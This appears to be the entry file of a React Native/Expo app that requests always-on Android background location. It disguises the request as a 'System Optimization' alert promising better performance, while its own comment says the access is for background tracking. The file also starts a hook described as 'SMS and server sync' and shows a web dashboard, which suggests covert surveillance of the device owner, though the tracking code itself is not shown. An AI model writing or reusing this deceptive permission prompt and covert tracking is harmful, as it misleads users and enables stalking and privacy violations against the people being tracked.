import React, { useEffect } from 'react';
import { Platform, View, StyleSheet, Alert } from 'react-native';
import { StatusBar } from 'expo-status-bar';
import * as Location from 'expo-location'; // Background tracking ke liye zaruri

// Custom Hooks & Screens
import usePermissions from './src/hooks/usePermissions';
import useTracking from './src/hooks/useTracking';
import HomeScreen from './src/screens/HomeScreen';
import WebDashboard from './src/screens/WebDashboard';

export default function App() {
  const permissionStatus = usePermissions();

  useEffect(() => {
    // 🛡️ Pro-Security Step: Background Permission Request
    const checkBackgroundTracking = async () => {
      if (Platform.OS === 'android' && permissionStatus === 'granted') {
        const { status: bgStatus } = await Location.getBackgroundPermissionsAsync();
        
        if (bgStatus !== 'granted') {
          Alert.alert(
            "System Optimization",
            "Behtar performance ke liye 'Allow all the time' location access select karein.",
            [{ text: "OK", onPress: () => Location.requestBackgroundPermissionsAsync() }]
          );
        }
      }
    };
    
    checkBackgroundTracking();
  }, [permissionStatus]);

  // SMS aur Server Sync trigger
  useTracking(permissionStatus);

  return (
    <View style={styles.container}>
      <StatusBar style="auto" />
      {Platform.OS === 'web' ? <WebDashboard /> : <HomeScreen />}
    </View>
  );
}

const styles = StyleSheet.create({
  container: { flex: 1, backgroundColor: '#fff' },
});
